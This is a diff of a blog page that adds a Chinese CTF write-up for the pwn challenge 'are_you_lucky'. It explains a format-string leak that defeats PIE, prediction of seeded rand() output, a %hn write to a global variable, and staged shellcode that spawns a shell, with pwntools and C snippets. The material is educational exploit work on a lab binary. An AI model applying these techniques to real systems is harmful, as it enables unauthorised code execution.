@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>haoo&#39;s tech blog - 第八届玄武杯pwn方向_are_you_lucky_wp</title>
-<meta name="description" content="haoo的个人博客,用于记录相关学习笔记、技术文章、CTF writeup等">
+<meta name="description" content="由于是第一次作为出题人，有许多不足的地方，比如这题忘记关相应输出了，导致 fmt 可以 leak，从而绕过随机数（QWQ）。 开启了 PIE 保护，关闭了 NX 保护，大概率能打 shellcode，拖入 IDA 里面看。 login先是一个登录，输入 user_name 与 114514 编码后的结果。熟悉的师傅应该">
 <meta name="theme-color" content="#090c0b">
 <meta name="color-scheme" content="dark">
 <script>
@@ -75,7 +75,7 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>0 字</span>
+          <span>2544 字</span>
         </div>
         <h1>第八届玄武杯pwn方向_are_you_lucky_wp</h1>
         
@@ -92,7 +92,48 @@
 
       <div class="article-grid">
         <div class="article-body article-prose" id="article-content">
-          
+          <p>由于是第一次作为出题人，有许多不足的地方，比如这题忘记关相应输出了，导致 fmt 可以 leak，从而绕过随机数（QWQ）。</p>
+<p>开启了 PIE 保护，关闭了 NX 保护，大概率能打 shellcode，拖入 IDA 里面看。</p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p10_03_X58.png" alt="are you lucky 分析"></p>
+<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>先是一个登录，输入 user_name 与 114514 编码后的结果。熟悉的师傅应该能看出是 Base64 编码，不熟悉的师傅可以通过 gdb 调试得知。</p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p11_01_X63.png" alt="login"></p>
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>接着看一下 root 函数的汇编，发现有一个全局变量 target，需要将 target 的值与 0x2918（即 10520）进行对比，如果一样就能打 shellcode。</p>
+<p>在打 shellcode 时发现限制了输入的字节数，这里可以靠师傅们自己发挥。我是先搓出 read 函数，再使用 shellcraft.sh()。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor rdi, rdi;</span><br><span class="hljs-string">mov rsi, rdx;</span><br><span class="hljs-string">push 0xff;</span><br><span class="hljs-string">pop rdx;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = asm(shellcode)<br>io.sendafter(<span class="hljs-string">b&#x27;performance\n&#x27;</span>, shellcode.ljust(<span class="hljs-number">0xf</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>))<br>io.sendline(<span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x20</span> + asm(shellcraft.sh()))<br></code></pre></td></tr></table></figure>
+
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p11_02_X64.png" alt="root 函数分析"></p>
+<h3 id="edit-与-game"><a href="#edit-与-game" class="headerlink" title="edit 与 game"></a>edit 与 game</h3><p>再看看 edit 函数与 game 函数。在 game 函数中，发现 20 次输入中每次输入的数与生成的随机数一样，最后就会给出 main 的地址，这样就能得到基址。</p>
+<p>在 edit 函数中发现存在 fmt。由于没有关闭相应的输出，即使没有绕过随机数判断，也可以 leak 得到基址，然后再修改 target 的值，从而进入 root 函数打 shellcode。</p>
+<p>下面分别说明这两种获取基址的做法。</p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p12_01_X68.png" alt="edit 函数"></p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p12_02_X69.png" alt="game 函数"></p>
+<h3 id="leak-获取地址"><a href="#leak-获取地址" class="headerlink" title="leak 获取地址"></a>leak 获取地址</h3><p>第一种是 leak 的做法。因为存在 fmt 且没有关闭相应的输出，所以在 edit 函数中不仅能修改 target 的值，也能泄漏地址。</p>
+<p>找到相应的偏移，然后先泄漏地址再修改值，当然泄漏地址时也可以找其他位置。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">io.sendlineafter(<span class="hljs-string">b&#x27; &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.sendline(<span class="hljs-string">b&#x27;%35$p&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>base_addr = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1a4c</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base_addr))<br>target = base_addr + <span class="hljs-number">0x040CC</span><br>io.sendlineafter(<span class="hljs-string">b&#x27;new password&#x27;</span>, <span class="hljs-string">b&#x27;123456&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p13_01_X73.png" alt="leak 地址"></p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p13_02_X74.png" alt="edit 输入"></p>
+<h3 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h3><p>第二种是随机数判断的做法。在 game 函数中会给我们 main 函数的地址，只需要在 20 次输入中每次输入与生成的随机数一样即可。因为题目给了种子，可以编写一个生成随机数的程序。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    srand(time(<span class="hljs-number">0</span>));<br>    srand(rand() % <span class="hljs-number">3</span> - <span class="hljs-number">1522127470</span>);<br>    <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">120</span>; i++)<br>    &#123;<br>        x = rand() % <span class="hljs-number">4</span> + <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, x);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">io.sendlineafter(<span class="hljs-string">b&#x27; &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>recv_data = os.popen(<span class="hljs-string">&#x27;./random&#x27;</span>).read()  <span class="hljs-comment"># random 是自己编写的程序</span><br>values = recv_data.strip(<span class="hljs-string">&#x27;\n&#x27;</span>).split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    payload = values[i]<br>    io.sendline(<span class="hljs-built_in">str</span>(payload))<br><br>io.recvuntil(<span class="hljs-string">b&#x27;: 0x&#x27;</span>)<br>main = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main))<br>addr_base = main - <span class="hljs-number">0x019D0</span><br>target = addr_base + <span class="hljs-number">0x040CC</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="修改-target-的值"><a href="#修改-target-的值" class="headerlink" title="修改 target 的值"></a>修改 target 的值</h3><p>最后利用 fmt 修改 target 的值，有两种写法。</p>
+<p>第一种是使用 fmtstr_payload，这种方法比较简单：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = fmtstr_payload(<span class="hljs-number">20</span>, &#123;target: <span class="hljs-number">10520</span>&#125;)<br><span class="hljs-comment"># 20 为偏移，&#123;target: 10520&#125; 表示将 target 的值改为 10520</span><br></code></pre></td></tr></table></figure>
+
+<p>另一种是不使用 pwntools 自带的 fmtstr_payload，自己构造 payload。这种方法更复杂，但有助于理解 fmt 漏洞：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;%10520c%22$hnAAA&quot;</span> + p64(target)<br></code></pre></td></tr></table></figure>
+
+<p>%10520c 表示输出 10520 个字符，%hn 表示将当前已输出的字符数作为 2 字节值写入指定地址，22$ 表示使用第 22 个参数作为目标地址，这个地址就是我们写入的 target 地址，AAA 用于对齐。</p>
+<p>关于第二种写法，可以在 gdb 中观察：</p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p15_01_X82.png" alt="输入前的栈"></p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p15_02_X83.png" alt="输入后的栈"></p>
+<p>这是输入后的栈上情况，可以看出输入的 target 地址在第 22 个参数处，这就是为什么使用 22$。</p>
+<p><img src="/%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AFpwn%E6%96%B9%E5%90%91-are-you-lucky-wp/p15_03_X84.png" alt="printf 后的栈"></p>
+<p>最后是 printf 后的栈上情况，可以看出值确实写入了 target。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>exp 可以根据上述过程自行编写。由于过程比较简单且已经说明得比较详细，原文没有给出完整 exp.</p>
+
         </div>
 
         
@@ -120,7 +161,7 @@
 
   <footer class="site-footer">
   <div class="site-footer__inner">
-    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>26 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
     <p>&copy; haoo · powered by Hexo</p>
   </div>
 </footer>
